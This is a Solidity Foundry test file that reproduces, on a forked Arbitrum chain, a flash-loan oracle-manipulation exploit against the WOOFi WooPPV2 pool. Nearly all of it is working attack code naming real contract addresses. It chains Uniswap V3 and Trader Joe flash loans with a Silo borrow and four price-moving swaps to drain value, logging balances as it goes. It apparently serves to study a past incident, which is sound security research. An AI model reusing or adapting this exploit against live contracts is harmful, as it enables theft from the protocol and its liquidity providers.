// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {IERC20} from 'forge-std/interfaces/IERC20.sol';

import '../src/interfaces/ITraderJoe.sol';
import '../src/interfaces/ISilo.sol';
import '../src/interfaces/IUniSwapV3Pool.sol';
import '../src/interfaces/IWooPPV2.sol';
import '../src/interfaces/IWETH.sol';
import '../src/interfaces/IWooOracleV2.sol';

contract WOOFiAttacker is Test {
    address constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WOO = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b;
    ITraderJoe constant TRADERJOE = ITraderJoe(0xB87495219C432fc85161e4283DfF131692A528BD);
    ISilo constant SILO = ISilo(0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F);
    IWooPPV2 constant WOOPPV2 = IWooPPV2(0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062);
    IWooOracleV2 constant WOOORACLEV2 = IWooOracleV2(0x73504eaCB100c7576146618DC306c97454CB3620);
    IUniswapV3Pool constant POOL = IUniswapV3Pool(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    uint256 constant MAX_UINT = type(uint256).max;
    uint256 uniSwapFlashAmount;
    uint256 traderJoeFlashAmount;

    enum Action {
        NORMAL,
        REENTRANT
    }

    function setUp() public {
        bytes32 txHash = 0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd;
        vm.createSelectFork("arb", txHash);
    }

    function testAttack() public {
        // log the state beforehand
        console.log("Attacker's balance before attack:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        uint256 ethBalanceBefore = address(this).balance;
        console.log("ETH:", ethBalanceBefore / 1e18, "ETH \n");

        // initiate the attack
        initFlash();

        // log the state after
        console.log("Attacker's balance after attack:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        uint256 ethBalanceAfter = address(this).balance;
        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH \n");

    }

    /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
    function initFlash() public {
        // inital approvals required for the tokens 
        IERC20(WOO).approve(address(WOOPPV2), MAX_UINT);
        IERC20(WOO).approve(address(SILO), MAX_UINT);
        IERC20(USDC).approve(address(SILO), MAX_UINT);
        IERC20(USDC).approve(address(WOOPPV2), MAX_UINT);

        // get the USDC balance of the UniSwap pool
        uniSwapFlashAmount = IERC20(USDC).balanceOf(address(POOL));
        console.log("UniSwap Flash Amount: ", uniSwapFlashAmount / 1e6, "USDC \n");

        // flash loan USDC - calls uniswapV3FlashCallback
        POOL.flash(
            address(this),
            0,
            uniSwapFlashAmount,
            abi.encode(uint256(1))
        );

        // swap excess USDC for WETH
        int256 swapAmount = int256(IERC20(USDC).balanceOf(address(this)));
        POOL.swap(address(this), false, swapAmount, 5148059652436460709226212, new bytes(0));

        // withdraw excess WETH to this contract via the fallback function
        uint256 excessWETHBalance = IERC20(WETH).balanceOf(address(this));
        IWETH(WETH).withdraw(excessWETHBalance);
        //uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
        //IERC20(WOO).transfer({some_other_address}, excessWOOBalance); // would only need to do this if sending to an attaker EOA
    }

    /// @param fee0 The fee from calling flash for token0
    /// @param fee1 The fee from calling flash for token1
    /// @param data The data needed in the callback passed as FlashCallbackData from `initFlash`
    /// @notice implements the callback called from flash
    /// @dev fails if the flash is not profitable, meaning the amountOut from the flash is less than the amount borrowed
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // flash loan WOO

        // get the total pool amount 
        traderJoeFlashAmount = IERC20(WOO).balanceOf(address(TRADERJOE));
        console.log("TJ Flash Amount: ", traderJoeFlashAmount / 1e18, "WOO \n");
        bytes32 hashTraderJoeAmount = bytes32(traderJoeFlashAmount);

        // initiate the flash loan - calls LBFlashLoanCallback
        TRADERJOE.flashLoan(ILBFlashLoanCallback(address(this)), hashTraderJoeAmount, new bytes(0));

        // repay the Uniswap flash loan
        IERC20(USDC).transfer(msg.sender, uniSwapFlashAmount + fee1);
    }

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata data) external {
        IERC20(USDC).transfer(address(POOL), uint256(amount1));
    }

    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        bytes32 totalFees,
        bytes calldata data
    ) external returns (bytes32) {
        // deposit USDC and borrow all the WOO liquidity from Silo
        SILO.deposit(USDC, 7000000000000, true);
        uint256 amount = SILO.liquidity(WOO);
        SILO.borrow(WOO, amount);

        // log state before swapping
        console.log("State before swapping");
        console.log("Oracle prices (8 decimals):");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("Attacker's balance:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("Reserves:");
        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");

        // 4 consecutive swaps:

        // 1. USDC -> WETH
        IERC20(USDC).transfer(address(WOOPPV2), 2000000000000);
        WOOPPV2.swap(USDC, WETH, 2000000000000, 0, address(this), address(this));
        // log state
        console.log("State after swapping USDC -> WETH");
        console.log("Oracle prices (8 decimals):");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("Attacker's balance:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("Reserves:");
        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");

        // 2. USDC -> WOO 
        IERC20(USDC).transfer(address(WOOPPV2), 100000000000);
        WOOPPV2.swap(USDC, WOO, 100000000000, 0, address(this), address(this));
        // log state
        console.log("State after swapping USDC -> WOO");
        console.log("Oracle prices (8 decimals):");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("Attacker's balance:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("Reserves:");
        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");

        // 3. WOO -> USDC
        IERC20(WOO).transfer(address(WOOPPV2), 7856868800000000000000000);
        WOOPPV2.swap(WOO, USDC, 7856868800000000000000000, 0, address(this), address(this));
        // log state
        console.log("State after swapping WOO -> USDC");
        console.log("Oracle prices (8 decimals):");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("Attacker's balance:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("Reserves:");
        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");

        // 4. USDC -> WOO // reap the rewards
        IERC20(USDC).transfer(address(WOOPPV2), 926342);
        WOOPPV2.swap(USDC, WOO, 926342, 0, address(this), address(this));
        // log state
        console.log("State after swapping USDC -> WOO");
        console.log("Oracle prices (8 decimals):");
        console.log("USDC: ", _getPrice(USDC));
        console.log("WOO: ", _getPrice(WOO));
        console.log("WETH: ", _getPrice(WETH));
        console.log("Attacker's balance:");
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
        console.log("Reserves:");
        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH \n");

        // repay WOO loan to Silo & withdraw USDC
        SILO.repay(WOO, MAX_UINT);
        SILO.withdraw(USDC, MAX_UINT, true);
        
        // repay the Trader Joe flash loan
        IERC20(WOO).transfer(msg.sender, uint256(amounts) + uint256(totalFees));

        // TJ flash loans require the following data to be returned
        bytes32 returnData = keccak256("LBPair.onFlashLoan");
        return returnData;
    }

    receive() external payable {}

    /* ----- Helper Functions ----- */

    function _getPrice(address asset) internal view returns (uint256) {
        (uint256 priceNow, bool feasible) = WOOORACLEV2.price(asset);
        return priceNow;
    }

    function _getTokenInfo(address token) internal view returns (uint192) {
        IWooPPV2.TokenInfo memory tokenInfo = WOOPPV2.tokenInfos(token);
        return tokenInfo.reserve;
    }
    
}
